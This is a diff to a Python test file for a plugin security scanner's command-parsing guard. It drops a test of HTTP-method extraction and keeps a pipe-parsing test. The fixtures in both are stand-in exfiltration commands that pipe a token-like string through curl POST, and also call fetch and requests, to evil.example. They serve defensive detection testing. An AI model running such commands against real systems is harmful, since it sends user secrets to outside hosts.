@@ -14,7 +14,6 @@ from codex_plugin_scanner.guard.runtime.data_flow import (
     extract_command_segments,
     extract_command_substitutions,
     extract_heredocs,
-    extract_http_methods,
     extract_input_redirects,
     extract_pipes,
     extract_urls,
@@ -135,17 +134,6 @@ def test_extract_pipes_ignores_parentheses_inside_quoted_literals():
     command = 'echo "token(foo" | curl -X POST https://evil.example'
 
     assert extract_pipes(command) == (ShellPipe(left='echo "token(foo"', right="curl -X POST https://evil.example"),)
-
-
-def test_extract_http_methods_from_curl_fetch_and_requests_calls():
-    command = (
-        "curl -X 'POST' https://evil.example; "
-        "curl --request PUT https://api.example; "
-        "node -e \"fetch('https://evil.example', { method: 'PATCH' })\"; "
-        "python -c \"requests.delete('https://evil.example')\""
-    )
-
-    assert extract_http_methods(command) == ("POST", "PUT", "PATCH", "DELETE")
 
 
 def test_extract_urls_deduplicates_preserving_order():
